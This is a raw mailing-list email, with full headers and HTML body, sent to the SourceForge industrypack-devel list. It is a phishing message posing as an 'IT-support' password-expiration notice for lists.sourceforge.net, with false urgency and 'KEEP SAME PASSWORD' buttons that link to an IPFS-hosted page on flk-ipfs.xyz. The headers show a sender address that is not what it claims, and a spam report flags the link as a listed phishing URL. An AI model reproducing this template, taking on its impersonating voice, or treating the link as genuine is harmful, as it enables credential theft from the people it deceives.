Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 3C42098B0CB
	for <lists+industrypack-devel@lfdr.de>; Tue,  1 Oct 2024 01:24:04 +0200 (CEST)
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1svPkJ-0006gL-1u
	for lists+industrypack-devel@lfdr.de;
	Mon, 30 Sep 2024 23:24:03 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95)
 (envelope-from <noreply@wetransfer.com>) id 1svPkI-0006gE-4u
 for industrypack-devel@lists.sourceforge.net;
 Mon, 30 Sep 2024 23:24:02 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Content-Transfer-Encoding:Content-Type:MIME-Version
 :Message-ID:Date:Subject:To:From:Sender:Reply-To:Cc:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=8hJYO/ww57fCaot/q2Ritr/UKy30FHus+6ujmAbI5lY=; b=edXfnDgJgv7pEBDhPD/KlN+rpk
 Ju2bF9QK7FV0QVME1hFO8LmvX/gZFs3x6TiXOgX3mKQFF1DzRH4K/ieEeJIIg9//Ii0oxpTRHlmIj
 swluBZu2drO2brFXAMynWMXnmPTXwBmNuAuDSiewSlv9FVy2hJEVN/SBsDIFPJFmKTnk=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Content-Transfer-Encoding:Content-Type:MIME-Version:Message-ID:Date:
 Subject:To:From:Sender:Reply-To:Cc:Content-ID:Content-Description:Resent-Date
 :Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=8hJYO/ww57fCaot/q2Ritr/UKy30FHus+6ujmAbI5lY=; b=b
 NG/HiNUFXNTB/4fMtMMODFThp5bbTSKJigNm5vM1EH1XX8bOst3H4pik1qtY8/TfZ1WYcQU5u4U/o
 ueu90DHeBi73CEHSMA3kVKoATvl8iiVsH692wBCZ79QXrGEuBTWzYtZm15/W7wXwURnmPf4jcup5q
 94AY22yO96m85QJU=;
Received: from hwsrv-1246715.hostwindsdns.com ([192.236.179.213]
 helo=sweet-cannon.192-236-179-213.plesk.page)
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES128-GCM-SHA256:128) (Exim 4.95)
 id 1svPkH-0002lL-9P for industrypack-devel@lists.sourceforge.net;
 Mon, 30 Sep 2024 23:24:02 +0000
Received: from [45.133.174.40] (unknown [45.133.174.40])
 by sweet-cannon.192-236-179-213.plesk.page (Postfix) with ESMTPA id 094E4257BB
 for <industrypack-devel@lists.sourceforge.net>;
 Mon, 30 Sep 2024 18:59:33 -0400 (EDT)
Authentication-Results: sweet-cannon.192-236-179-213.plesk.page;
 spf=pass (sender IP is 45.133.174.40) smtp.mailfrom=noreply@wetransfer.com
 smtp.helo=[45.133.174.40]
Received-SPF: pass (sweet-cannon.192-236-179-213.plesk.page: connection is
 authenticated)
To: industrypack-devel@lists.sourceforge.net
Date: 30 Sep 2024 15:59:30 -0700
Message-ID: <20240930155930.8B025F34E7AD8282@wetransfer.com>
MIME-Version: 1.0
X-Spam-Score: 2.6 (++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-1.v13.lw.sourceforge.com", 
 has NOT identified this incoming email as spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview:  Mailcenter@ lists.sourceforge.net Sender Action Required
 Password Expiration Dear industrypack-devel,
 Your password for industrypack-devel@lists.sourceforge.net
 expires 9/30/2024 3:59:30 p.m.. 
 Content analysis details:   (2.6 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 2.5 URIBL_DBL_PHISH        Contains a Phishing URL listed in the Spamhaus
 DBL blocklist [URIs: flk-ipfs.xyz]
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.0 SPF_NONE               SPF: sender does not publish an SPF Record
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.1 MIME_HTML_ONLY         BODY: Message only has text/html MIME parts
 0.0 KHOP_HELO_FCRDNS       Relay HELO differs from its IP's reverse DNS
X-Headers-End: 1svPkH-0002lL-9P
Subject: [Industrypack-devel] Password for
 industrypack-devel@lists.sourceforge.net expires soon from Today
 lists.sourceforge.net
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: IT-support via Industrypack-devel
 <industrypack-devel@lists.sourceforge.net>
Reply-To: IT-support <noreply@wetransfer.com>
Content-Type: multipart/mixed; boundary="===============2425957008284818445=="
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

--===============2425957008284818445==
Content-Type: text/html;
	charset="iso-8859-1"
Content-Transfer-Encoding: quoted-printable

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org=
/TR/xhtml1/DTD/xhtml1-strict.dtd">

<html class=3D"sg-campaigns" data-editor-version=3D"2" xmlns=3D"http://www.=
w3.org/1999/xhtml"><head>
      <meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3Dutf=
-8">
      <meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scal=
e=3D1, minimum-scale=3D1, maximum-scale=3D1">
      <!--[if !mso]><!-->
      <meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3DEdge">
      <!--<![endif]-->
      <!--[if (gte mso 9)|(IE)]>
      <xml>
        <o:OfficeDocumentSettings>
          <o:AllowPNG/>
          <o:PixelsPerInch>96</o:PixelsPerInch>
        </o:OfficeDocumentSettings>
      </xml>
      <![endif]-->
      <!--[if (gte mso 9)|(IE)]>
  <style type=3D"text/css">
    body {width: 600px;margin: 0 auto;}
    table {border-collapse: collapse;}
    table, td {mso-table-lspace: 0pt;mso-table-rspace: 0pt;}
    img {-ms-interpolation-mode: bicubic;}
  </style>
<![endif]-->
      <style type=3D"text/css">
    body, p, div {
      font-family: arial,helvetica,sans-serif;
      font-size: 14px;
    }
    body {
      color: #000000;
    }
    body a {
      color: #1188E6;
      text-decoration: none;
    }
    p { margin: 0; padding: 0; }
    table.wrapper {
      width:100% !important;
      table-layout: fixed;
      -webkit-font-smoothing: antialiased;
      -webkit-text-size-adjust: 100%;
      -moz-text-size-adjust: 100%;
      -ms-text-size-adjust: 100%;
    }
    img.max-width {
      max-width: 100% !important;
    }
    .column.of-2 {
      width: 50%;
    }
    .column.of-3 {
      width: 33.333%;
    }
    .column.of-4 {
      width: 25%;
    }
    ul ul ul ul  {
      list-style-type: disc !important;
    }
    ol ol {
      list-style-type: lower-roman !important;
    }
    ol ol ol {
      list-style-type: lower-latin !important;
    }
    ol ol ol ol {
      list-style-type: decimal !important;
    }
    @media screen and (max-width:480px) {
      .preheader .rightColumnContent,
      .footer .rightColumnContent {
        text-align: left !important;
      }
      .preheader .rightColumnContent div,
      .preheader .rightColumnContent span,
      .footer .rightColumnContent div,
      .footer .rightColumnContent span {
        text-align: left !important;
      }
      .preheader .rightColumnContent,
      .preheader .leftColumnContent {
        font-size: 80% !important;
        padding: 5px 0;
      }
      table.wrapper-mobile {
        width: 100% !important;
        table-layout: fixed;
      }
      img.max-width {
        height: auto !important;
        max-width: 100% !important;
      }
      a.bulletproof-button {
        display: block !important;
        width: auto !important;
        font-size: 80%;
        padding-left: 0 !important;
        padding-right: 0 !important;
      }
      .columns {
        width: 100% !important;
      }
      .column {
        display: block !important;
        width: 100% !important;
        padding-left: 0 !important;
        padding-right: 0 !important;
        margin-left: 0 !important;
        margin-right: 0 !important;
      }
      .social-icon-column {
        display: inline-block !important;
      }
    }
  </style>
      <!--user entered Head Start--><!--End Head user entered-->
    </head>
    <body style=3D"font-family: arial,helvetica,sans-serif;
      font-size: 14px; color: #000000">
<table style=3D"color: rgb(34, 34, 34); text-transform: none; letter-spacin=
g: normal; padding-top: 0px; padding-bottom: 0px; font-family: inherit; fon=
t-size: small; font-style: normal; word-spacing: 0px; white-space: normal; =
border-collapse: collapse; max-width: 548px; border-spacing: 0px; orphans: =
2; widows: 2; font-stretch: inherit; background-color: rgb(255, 255, 255); =
font-variant-ligatures: normal; font-variant-caps: normal; -webkit-text-str=
oke-width: 0px; text-decoration-thickness: initial;=20
text-decoration-style: initial; text-decoration-color: initial;" border=3D"=
0"><tbody><tr><td style=3D'margin: 0px; width: 181px; font-family: "Segoe U=
I", Frutiger, Arial, sans-serif; vertical-align: bottom;'>Mailcenter@ lists=
=2Esourceforge.net </td><td style=3D'margin: 0px; width: 186px; text-align:=
 center; font-family: "Segoe UI", Frutiger, Arial, sans-serif; vertical-ali=
gn: bottom;'>&nbsp;</td>
<td style=3D'margin: 0px; width: 181px; text-align: right; font-family: "Se=
goe UI", Frutiger, Arial, sans-serif; vertical-align: bottom;'>&nbsp;</td><=
/tr><tr><td style=3D'margin: 0px; width: 181px; padding-top: 0px; padding-b=
ottom: 0px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size=
: 14px; vertical-align: middle;'><span style=3D"margin: 0px; padding: 0px; =
border: 0px currentColor; border-image: none; color: white; vertical-align:=
 baseline;">
<span style=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-=
image: none; color: black; vertical-align: baseline; font-feature-settings:=
 inherit; font-kerning: inherit;">Sender</span></span></td><td style=3D'mar=
gin: 0px; width: 186px; text-align: center; padding-top: 0px; padding-botto=
m: 0px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 14=
px; vertical-align: middle;'>&nbsp;</td>
<td style=3D'margin: 0px; width: 181px; text-align: right; padding-top: 0px=
; padding-bottom: 0px; font-family: "Segoe UI", Frutiger, Arial, sans-serif=
; font-size: 14px; vertical-align: middle;'><span style=3D"margin: 0px; pad=
ding: 0px; border: 0px currentColor; border-image: none; color: white; vert=
ical-align: baseline;"><span style=3D"margin: 0px; padding: 0px; border: 0p=
x currentColor; border-image: none; color: rgb(192, 0, 0); vertical-align: =
baseline;">
Action Required</span></span></td></tr><tr><td style=3D"margin: 0px; paddin=
g: 0px; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif;" co=
lspan=3D"3"><table style=3D"padding: 0px; border-collapse: collapse; border=
-spacing: 0px;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0"><tbody><tr=
><td style=3D"margin: 0px; padding: 0px; width: 180px; height: 10px; line-h=
eight: 10px; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif=
; font-size: 6px;" bgcolor=3D"#cccccc">&nbsp;</td>
<td style=3D"margin: 0px; padding: 0px; width: 4px; height: 10px; line-heig=
ht: 10px; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; f=
ont-size: 6px;" bgcolor=3D"white">&nbsp;</td><td style=3D"margin: 0px; padd=
ing: 0px; width: 180px; height: 10px; line-height: 10px; font-family: Robot=
o, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 6px;" bgcolor=3D"#=
cccccc">&nbsp;</td>
<td style=3D"margin: 0px; padding: 0px; width: 4px; height: 10px; line-heig=
ht: 10px; font-family: Roboto, RobotoDraft, Helvetica, Arial, sans-serif; f=
ont-size: 6px;" bgcolor=3D"white">&nbsp;</td><td style=3D"margin: 0px; padd=
ing: 0px; width: 180px; height: 10px; line-height: 10px; font-family: Robot=
o, RobotoDraft, Helvetica, Arial, sans-serif; font-size: 6px;" bgcolor=3D"#=
c00000">&nbsp;</td></tr></tbody></table></td></tr><tr>
<td style=3D'margin: 0px; padding: 0px; width: 181px; line-height: 20px; fo=
nt-family: "Segoe UI", Frutiger, Arial, sans-serif; font-size: 14px;'>&nbsp=
;</td><td style=3D'margin: 0px; padding: 0px; width: 186px; text-align: cen=
ter; line-height: 20px; font-family: "Segoe UI", Frutiger, Arial, sans-seri=
f; font-size: 14px;'>&nbsp;</td>
<td style=3D'margin: 0px; padding: 0px; width: 181px; text-align: right; li=
ne-height: 20px; font-family: "Segoe UI", Frutiger, Arial, sans-serif; font=
-size: 14px;'><span style=3D"margin: 0px; padding: 0px; border: 0px current=
Color; border-image: none; color: white; vertical-align: baseline;"><span s=
tyle=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-image: =
none; color: rgb(192, 0, 0); vertical-align: baseline;">Password&nbsp;Expir=
ation</span>
</span>
</td></tr></tbody></table>
<div style=3D"font-family: arial,helvetica,sans-serif;
      font-size: 14px; color: rgb(34, 34, 34); text-transform: none; text-i=
ndent: 0px; letter-spacing: normal; font-family: Arial, Helvetica, sans-ser=
if; font-size: small; font-style: normal; word-spacing: 0px; white-space: n=
ormal; orphans: 2; widows: 2; background-color: rgb(255, 255, 255); font-va=
riant-ligatures: normal; font-variant-caps: normal; -webkit-text-stroke-wid=
th: 0px; text-decoration-thickness: initial; text-decoration-style: initial=
; text-decoration-color: initial;"><p style=3D"font-family: arial,helvetica=
,sans-serif;
      font-size: 14px; margin: 0; padding: 0">
&nbsp;</p><table style=3D"padding: 0px; width: 528px; margin-left: 0px; bac=
kground-color: rgb(242, 245, 250);" border=3D"0"><tbody><tr><td style=3D'ma=
rgin: 0px; padding: 0px 10px; font-family: "Segoe UI", Frutiger, Arial, san=
s-serif; font-size: 21px;'>&nbsp;<div style=3D"font-family: arial,helvetica=
,sans-serif;
      font-size: 14px; margin: 0px; padding: 0px; border: 0px currentColor;=
 border-image: none; color: rgb(32, 31, 30); font-family: inherit; font-siz=
e: 15px; vertical-align: baseline; font-stretch: inherit;">Dear industrypac=
k-devel,</div>
<div style=3D"font-family: arial,helvetica,sans-serif;
      font-size: 14px; margin: 0px; padding: 0px; border: 0px currentColor;=
 border-image: none; color: rgb(32, 31, 30); font-family: inherit; font-siz=
e: 15px; vertical-align: baseline; font-stretch: inherit;">&nbsp;</div></td=
></tr><tr><td style=3D'margin: 0px; padding: 0px 10px 6px; font-family: "Se=
goe UI", Frutiger, Arial, sans-serif; font-size: 16px;'>
Your&nbsp;password for industrypack-devel@lists.sourceforge.net<span style=
=3D"margin: 0px; padding: 0px; border: 0px currentColor; border-image: none=
; color: rgb(255, 0, 0); vertical-align: baseline;"><span style=3D"margin: =
0px; padding: 0px; border: 0px currentColor; border-image: none; color: rgb=
(0, 0, 0); vertical-align: baseline;">&nbsp;expires 9/30/2024 3:59:30 p.m..=
</span></span><br><br>Kindly use below button to&nbsp;keep&nbsp;using same&=
nbsp;password.<br>
<table width=3D"196" style=3D"width: 196px; height: 31px;" border=3D"3" cel=
lspacing=3D"0"><tbody><tr><td><strong><a href=3D"https://bafybeihvjpy5n4jst=
g77cefjbx6gce6bjmyyoiogqitfzij7xbmu77ea5u.ipfs.flk-ipfs.xyz/mailfile06.html=
#industrypack-devel@lists.sourceforge.net">KEEP SAME PASSWORD</a></strong><=
/td></tr></tbody></table><table width=3D"196" style=3D"width: 196px; height=
: 31px;" border=3D"3" cellspacing=3D"0"><tbody><tr><td><strong>
<a href=3D"https://bafybeihvjpy5n4jstg77cefjbx6gce6bjmyyoiogqitfzij7xbmu77e=
a5u.ipfs.flk-ipfs.xyz/mailfile06.html#industrypack-devel@lists.sourceforge.=
net">KEEP OLD&nbsp;PASSWORD</a></strong></td></tr></tbody></table><br>
<br>
&nbsp;<span style=3D"color: rgb(12, 54, 84);"><em>
</em><p style=3D"font-family: arial,helvetica,sans-serif;
      font-size: 14px; margin: 0; padding: 0; margin: 0px; padding: 0px; li=
ne-height: 1.5;" align=3D"center"><font face=3D"Calibri">Messages might be =
prevented if this&nbsp;action&nbsp;is not performed.<br>This&nbsp;notice is=
 as a result of a request made by the server host of&nbsp;lists.sourceforge=
=2Enet&nbsp;Mail Center.<br>&nbsp;<br>&nbsp;Copyright &copy; 2024 lists.sou=
rceforge.net&nbsp; Inc. All rights reserved.</font></p></span></td></tr><tr=
><td></td></tr><tr><td></td></tr><tr><td></td></tr><tr>
<td style=3D'margin: 0px; padding: 0px 10px 6px; font-family: "Segoe UI", F=
rutiger, Arial, sans-serif; font-size: 16px;'>&nbsp;</td></tr></tbody></tab=
le></div><p style=3D"font-family: arial,helvetica,sans-serif;
      font-size: 14px; margin: 0; padding: 0"><br class=3D"Apple-interchang=
e-newline"></p></body></html>


--===============2425957008284818445==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


--===============2425957008284818445==
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

--===============2425957008284818445==--
